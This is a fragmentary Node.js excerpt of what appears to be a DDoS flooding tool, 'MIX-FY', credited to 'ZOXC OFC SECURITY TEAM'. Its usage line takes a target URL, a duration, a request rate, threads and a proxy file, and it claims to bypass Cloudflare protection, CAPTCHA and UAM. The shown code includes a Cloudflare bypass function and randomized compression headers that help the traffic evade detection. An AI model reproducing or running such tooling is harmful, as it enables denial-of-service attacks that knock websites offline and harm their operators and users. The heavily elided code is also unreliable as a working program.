 // method by Erorr37 Cyber Scurity
...
module.exports = function Cloudflare() {
    ...
    function bypass(proxy, uagent, callback, force) {
        num = Math.random() * Math.pow(Math.random(), Math.floor(Math.random() * 100))
        var cookie = "";
 ...
 if (process.argv.length < 7){console.log(`EX: node MIX-FY https://neerd.my.id/ time/s rps thread proxy.txt\nBYPASS CFB, CAPTCHA, UAM`); process.exit();}
 const headers = {};
...
encoding_header = ["gzip, deflate, br", "compress, gzip", "deflate, gzip", "gzip, identity", "gzip, deflate", 'br', "br;q=1.0, gzip;q=0.8, *;q=0.1", 'gzip;q=1.0, identity; q=0.5, *;q=0', "gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25", "compress;q=0.5, gzip;q=1.0", "identity", 'gzip, compress', 'compress, deflate', "compress", "gzip, deflate, br", "deflate", 'gzip, deflate, lzma, sdch', 'deflate'];
...
console.log(`Methods DDoS By ZOXC OFC SECURITY TEAM`)
console.log(`--------------------------------------------`)
